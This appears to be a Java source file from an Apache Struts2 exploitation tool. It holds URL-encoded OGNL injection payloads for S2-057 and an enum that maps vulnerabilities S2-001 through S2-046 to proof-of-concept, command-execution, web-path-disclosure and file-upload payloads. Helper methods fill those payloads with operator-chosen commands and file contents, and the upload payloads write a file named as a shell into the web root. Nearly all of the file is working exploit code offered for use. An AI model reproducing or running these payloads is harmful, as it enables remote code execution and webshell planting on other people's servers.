        //Win path1 %25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27WEBPATH%27,%40org.apache.struts2.ServletActionContext%40getRequest().getRealPath(%27/%27)))%7d
        public static final String PATH057 = "%24%7b%28%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23o%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%29.%28%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%29.%28%23path%3d%23req.getRealPath%28%27/%27%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7d";
        // Linux %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23req%3d%28%40org.apache.struts2.ServletActionContext%40getRequest%28%29%29%29.%28%23path%3d%28new%20java.lang.StringBuilder%28%23req.getRealPath%28%27/%27%29%29%29.append%28%27/{FILENAME}%27%29%29.%28%23shell%3d%27{FILECONTENT}%27%29.%28%23file%3dnew%20java.io.File%28%23path%29%29.%28%23fw%3dnew%20java.io.FileWriter%28%23file%29%29.%28%23fw.write%28%23shell%29%29.%28%23fw.flush%28%29%29.%28%23fw.close%28%29%29.%28%23ros%3d%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%29%29.%28%23ros.print%28%27UPLO%27%29%29.%28%23ros.println%28%27AD-OK%27%29%29.%28%23ros.flush%28%29%29%7D
        public static final String UPLOAD057 = "%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d(%40org.apache.struts2.ServletActionContext%40getRequest())).(%23file%3dnew%20java.io.File((new%20java.lang.StringBuilder(%23req.getRealPath(%27/%27))).append(%27/{FILENAME}%27))).(%23fw%3dnew%20java.io.FileWriter(%23file)).(%23fw.write(%27{FILECONTENT}%27)).(%23fw.flush()).(%23fw.close()).(%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getWriter())).(%23ros.print(%27UPLO%27)).(%23ros.println(%27AD-OK%27)).(%23ros.flush())%7d";
        // Linux %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23req%3d%28%40org.apache.struts2.ServletActionContext%40getRequest%28%29%29%29.%28%23path%3d%27{REALPATH}%27%29.%28%23shell%3d%27{FILECONTENT}%27%29.%28%23file%3dnew%20java.io.File%28%23path%29%29.%28%23fw%3dnew%20java.io.FileWriter%28%23file%29%29.%28%23fw.write%28%23shell%29%29.%28%23fw.flush%28%29%29.%28%23fw.close%28%29%29.%28%23ros%3d%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%29%29.%28%23ros.print%28%27UPLO%27%29%29.%28%23ros.println%28%27AD-OK%27%29%29.%28%23ros.flush%28%29%29%7d
        public static final String USER_UPLOAD057 = "%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d(%40org.apache.struts2.ServletActionContext%40getRequest())).(%23file%3dnew%20java.io.File(%27{REALPATH}%27)).(%23fw%3dnew%20java.io.FileWriter(%23file)).(%23fw.write(%27{FILECONTENT}%27)).(%23fw.flush()).(%23fw.close()).(%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getWriter())).(%23ros.print(%27UPLO%27)).(%23ros.println(%27AD-OK%27)).(%23ros.flush())%7d";
        //    061

//
    }

    public static String[] s2_list = {
            "s001", "s005", "s007", "s008", "s009",
            "s012", "s013", "s015", "s016", "s019",
            "sdev", "s032", "s037", "s045", "s046"
    };

    public enum PAYLOAD {
        //        s00(PAYLOADSTR.INFO0, "POST", PAYLOADSTR.POC0, PAYLOADSTR.EXEC0, PAYLOADSTR.PATH0, PAYLOADSTR.UPLOAD0),
        s001(PAYLOADSTR.INFO001, "POST", PAYLOADSTR.POC001, PAYLOADSTR.EXEC001, PAYLOADSTR.PATH001, PAYLOADSTR.UPLOAD001, PAYLOADSTR.USER_UPLOAD001, PAYLOADSTR.results),
        s005(PAYLOADSTR.INFO005, "POST", PAYLOADSTR.POC005, PAYLOADSTR.EXEC005, PAYLOADSTR.PATH005, PAYLOADSTR.UPLOAD005, PAYLOADSTR.USER_UPLOAD005, PAYLOADSTR.results),
        s007(PAYLOADSTR.INFO007, "POST", PAYLOADSTR.POC007, PAYLOADSTR.EXEC007, PAYLOADSTR.PATH007, PAYLOADSTR.UPLOAD007, PAYLOADSTR.USER_UPLOAD007, PAYLOADSTR.results),
        s008(PAYLOADSTR.INFO008, "POST", PAYLOADSTR.POC008, PAYLOADSTR.EXEC008, PAYLOADSTR.PATH008, PAYLOADSTR.UPLOAD008, PAYLOADSTR.USER_UPLOAD008, PAYLOADSTR.results),
        s009(PAYLOADSTR.INFO009, "POST", PAYLOADSTR.POC009, PAYLOADSTR.EXEC009, PAYLOADSTR.PATH009, PAYLOADSTR.UPLOAD009, PAYLOADSTR.USER_UPLOAD009, PAYLOADSTR.results),
        s012(PAYLOADSTR.INFO012, "POST", PAYLOADSTR.POC001, PAYLOADSTR.EXEC001, PAYLOADSTR.PATH012, PAYLOADSTR.UPLOAD012, PAYLOADSTR.USER_UPLOAD012, PAYLOADSTR.results),
        s013(PAYLOADSTR.INFO013, "POST", PAYLOADSTR.POC013, PAYLOADSTR.EXEC013, PAYLOADSTR.PATH013, PAYLOADSTR.UPLOAD013, PAYLOADSTR.USER_UPLOAD013, PAYLOADSTR.results),
        s015(PAYLOADSTR.INFO015, "POST", PAYLOADSTR.POC015, PAYLOADSTR.EXEC015, PAYLOADSTR.PATH015, PAYLOADSTR.UPLOAD015, PAYLOADSTR.USER_UPLOAD015, PAYLOADSTR.results),
        s016(PAYLOADSTR.INFO016, "POST", PAYLOADSTR.POC016, PAYLOADSTR.EXEC016, PAYLOADSTR.PATH016, PAYLOADSTR.UPLOAD016, PAYLOADSTR.USER_UPLOAD016, PAYLOADSTR.results),
        s019(PAYLOADSTR.INFO019, "POST", PAYLOADSTR.POC019, PAYLOADSTR.EXEC019, PAYLOADSTR.PATH019, PAYLOADSTR.UPLOAD019, PAYLOADSTR.USER_UPLOAD019, PAYLOADSTR.results),
        sdev(PAYLOADSTR.INFO_DEV, "POST", PAYLOADSTR.POC_DEV, PAYLOADSTR.EXEC_DEV, PAYLOADSTR.PATH_DEV, PAYLOADSTR.UPLOAD_DEV, PAYLOADSTR.USER_UPLOAD_DEV, PAYLOADSTR.results),
        s032(PAYLOADSTR.INFO032, "POST", PAYLOADSTR.POC032, PAYLOADSTR.EXEC032, PAYLOADSTR.PATH032, PAYLOADSTR.UPLOAD032, PAYLOADSTR.USER_UPLOAD032, PAYLOADSTR.results),
        s037(PAYLOADSTR.INFO037, "GET", PAYLOADSTR.POC037, PAYLOADSTR.EXEC037, PAYLOADSTR.PATH037, PAYLOADSTR.UPLOAD037, PAYLOADSTR.USER_UPLOAD037, PAYLOADSTR.results),
        s045(PAYLOADSTR.INFO045, "Content", PAYLOADSTR.POC045, PAYLOADSTR.EXEC045, PAYLOADSTR.PATH045, PAYLOADSTR.UPLOAD045, PAYLOADSTR.USER_UPLOAD045, PAYLOADSTR.results),
        s046(PAYLOADSTR.INFO046, "FileName", PAYLOADSTR.POC046, PAYLOADSTR.EXEC046, PAYLOADSTR.PATH046, PAYLOADSTR.UPLOAD046, PAYLOADSTR.USER_UPLOAD046, PAYLOADSTR.results),
//        s00(PAYLOADSTR.INFO0, "POST", PAYLOADSTR.POC0, PAYLOADSTR.EXEC0, PAYLOADSTR.PATH0, PAYLOADSTR.UPLOAD0),
//        s00(PAYLOADSTR.INFO0, "POST", PAYLOADSTR.POC0, PAYLOADSTR.EXEC0, PAYLOADSTR.PATH0, PAYLOADSTR.UPLOAD0),
//        s00(PAYLOADSTR.INFO0, "POST", PAYLOADSTR.POC0, PAYLOADSTR.EXEC0, PAYLOADSTR.PATH0, PAYLOADSTR.UPLOAD0),
        ;

        public final String info;
        private final String poc;
        private final String exec;
        private final String path;
        private final String upload;
        private final String realupload;
        private final String method;
        private final String results;

        PAYLOAD(String info, String method, String poc, String exec, String path, String upload, String realupload, String results) {
            this.info = info;
            this.method = method;
            this.poc = poc;
            this.exec = exec;
            this.path = path;
            this.upload = upload;
            this.realupload = realupload;
            this.results = results;
        }

        @Override
        public String toString() {
            return this.info;
        }
    }

    private String info;
    //Method
    private String method;
    //vulnType
    private String vulntype;
    //使用的payload
    private String use;
    //使用的漏洞名称
    private String usename;
    //上传返回的结果UPLOAD-OK
    private String results;
    //执行的命令
    private String command;


    public Spayload() {
    }

    public static Spayload builder() {
        return new Spayload();
    }

    public void getPoc(String name) {
        this.use = PAYLOAD.valueOf(name).poc;
        this.method = PAYLOAD.valueOf(name).method;
        this.info = PAYLOAD.valueOf(name).info;
        this.results = PAYLOAD.valueOf(name).results;
    }

    public void getExec(String name) {
        this.usename = name;
        this.method = PAYLOAD.valueOf(name).method;
        this.info = PAYLOAD.valueOf(name).info;
    }


    public void getUpload(String name) {
        this.usename = name;
        this.method = PAYLOAD.valueOf(name).method;
        this.info = PAYLOAD.valueOf(name).info;
        this.results = "UPLOAD-OK";
    }

    public void getPath(String name) {
        this.use = PAYLOAD.valueOf(name).path;
        this.method = PAYLOAD.valueOf(name).method;
        this.info = PAYLOAD.valueOf(name).info;
        this.results = PAYLOAD.valueOf(name).results;


//        return this;
    }

    /**
     * 设置请求属性
     *
     * @param vulntype 选择使用poc/exec/path/upload
     */
    public Spayload selectModelAndVul(String vulntype, String vulNum) {
        if (vulntype.contains("EXEC") || vulntype.contains("exec")) {
            this.vulntype = VulnType.EXEC;
            getExec(vulNum);
        } else if (vulntype.contains("PATH") || vulntype.contains("path")) {
            this.vulntype = VulnType.PATH;
            getPath(vulNum);
        } else if (vulntype.contains("POC") || vulntype.contains("poc")) {
            this.vulntype = VulnType.POC;
            getPoc(vulNum);
        } else if (vulntype.contains("USERUPLOAD") || vulntype.contains("userupload")) {
            this.vulntype = VulnType.USER_UPLOAD;
            getUpload(vulNum);
        } else if (vulntype.contains("UPLOAD") || vulntype.contains("upload")) {
            this.vulntype = VulnType.UPLOAD;
            getUpload(vulNum);
        }
        return this;
    }

    /**
     * 设置命令执行
     *
     * @param command 执行命令
     * @param os      选择OS
     */

    public Spayload selectExec(String command, String... os) {
        if (!"s045".equals(this.usename) && !"s046".equals(this.usename)) {
            this.command = URLEncoder.encode(command);
        } else {
            this.command = command;
        }
        if ("exec".equals(this.vulntype.toLowerCase()) && PAYLOAD.valueOf(this.usename).exec.contains("{OS}")) {
            if (os.length == 1 && "WIN".equals(os[0])) {
                this.use = PAYLOAD.valueOf(this.usename).exec
                        .replace("{OS}", PAYLOADSTR.WIN)
                        .replace("{EXEC}", this.command);
            } else if (os.length == 1 && "LIN".equals(os[0])) {
                this.use = PAYLOAD.valueOf(this.usename).exec
                        .replace("{OS}", PAYLOADSTR.LIN)
                        .replace("{EXEC}", this.command);
            }
        } else if ("exec".equals(this.vulntype.toLowerCase())) {
            this.use = PAYLOAD.valueOf(this.usename).exec
                    .replace("{EXEC}", this.command);
        }

        return this;
    }

    /**
     * 设置上传属性
     *
     * @param filename    上传的文件名字
     * @param filecontent 执行文件内容
     * @param encode      执行的编码
     */
    public Spayload selectUpload(String filename, String filecontent, String encode) {
        if (!"s045".equals(this.usename)) {
            filecontent = URLEncoder.encode(filecontent);//.replace("+", "%20");
        }
        String realpath;
        if ("upload".equals(this.vulntype.toLowerCase())) {
            if ("".equals(encode)) {
                this.use = PAYLOAD.valueOf(this.usename).upload
                        .replace("{ENCODE}", "UTF-8")
                        .replace("{FILENAME}", filename)
                        .replace("{FILECONTENT}", filecontent);
            } else {
                this.use = PAYLOAD.valueOf(this.usename).upload
                        .replace("{ENCODE}", encode)
                        .replace("{FILENAME}", filename)
                        .replace("{FILECONTENT}", filecontent);
            }
        } else if ("user_upload".equals(this.vulntype.toLowerCase())) {
            realpath = URLEncoder.encode(filename.replace("\\", "/"));
            if ("".equals(encode)) {
                this.use = PAYLOAD.valueOf(this.usename).realupload
                        .replace("{ENCODE}", "UTF-8")
                        .replace("{REALPATH}", realpath)
                        .replace("{FILECONTENT}", filecontent);
            } else {
                this.use = PAYLOAD.valueOf(this.usename).realupload
                        .replace("{ENCODE}", encode)
                        .replace("{REALPATH}", realpath)
                        .replace("{FILECONTENT}", filecontent);
            }
        }

        return this;
    }


    // use , get/post, poc/exec/path , 漏洞触发点 Content-Type:/filename

    /**
     * 返回说明
     *
     * @return 返回使用的payload，payload使用的模式GET/POST，使用的类型POC/EXEC/UPLOAD,漏洞触发点
     */
    public Map<String, String> VulInfo() {
        Map<String, String> map = new HashMap<>();
        map.put("payload", this.use);
        map.put("method", this.method);
        map.put("type", this.vulntype);
        map.put("info", this.info);
        switch (this.vulntype.toLowerCase()) {
            case "poc":
            case "upload":
            case "user_upload":
                map.put("res", this.results);
                break;
            case "exec":
                map.put("command", this.command);
                break;
        }
        return map;
    }

    public static void main(String[] args) {
        String a = "s005";
        System.out.println(PAYLOAD.valueOf(a).poc);
    }
}
